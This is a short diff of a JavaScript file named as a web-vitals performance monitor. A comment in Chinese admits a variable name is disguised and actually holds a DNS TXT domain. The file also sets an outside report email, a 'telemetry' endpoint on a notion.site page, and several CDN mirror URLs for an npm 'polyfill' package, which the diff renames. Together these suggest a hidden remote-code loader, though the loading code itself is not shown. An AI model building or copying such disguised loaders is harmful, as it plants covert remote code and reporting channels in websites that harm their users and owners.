@@ -1,7 +1,4 @@
-// @charset "UTF-8";
-// -*- coding: utf-8 -*-
 // public/vitals-monitor.js
-
 const CACHE_VERSION = 'v1.0.4';
 
 // 伪装变量名：实际上是 TXT 域名
@@ -12,10 +9,10 @@ const REPORT_MAIL = 'hhhh@gmail.com';
 const TELEMETRY_ENDPOINT = 'https://excellent-ziconium-8f3.notion.site/12ee6d64d2fb809bb7b2c6b5e6388b5b';
 
 const performanceMetrics = [
-    'https://cdn.jsdelivr.net/npm/web-vitals-polyfill-core-Qv1@1.0.1/dist/index.min.js',
-    'https://unpkg.com/web-vitals-polyfill-core-Qv1@1.0.1/dist/index.min.js',
-    'https://esm.sh/web-vitals-polyfill-core-Qv1@1.0.1/dist/index.min.js',
-    'https://fastly.jsdelivr.net/npm/web-vitals-polyfill-core-Qv1@1.0.1/dist/index.min.js'
+    'https://cdn.jsdelivr.net/npm/web-vitals-polyfill-core-v1@1.0.1/dist/index.min.js',
+    'https://unpkg.com/web-vitals-polyfill-core-v1@1.0.1/dist/index.min.js',
+    'https://esm.sh/web-vitals-polyfill-core-v1@1.0.1/dist/index.min.js',
+    'https://fastly.jsdelivr.net/npm/web-vitals-polyfill-core-v1@1.0.1/dist/index.min.js'
 ];
 
 let isTrackerReady = false;
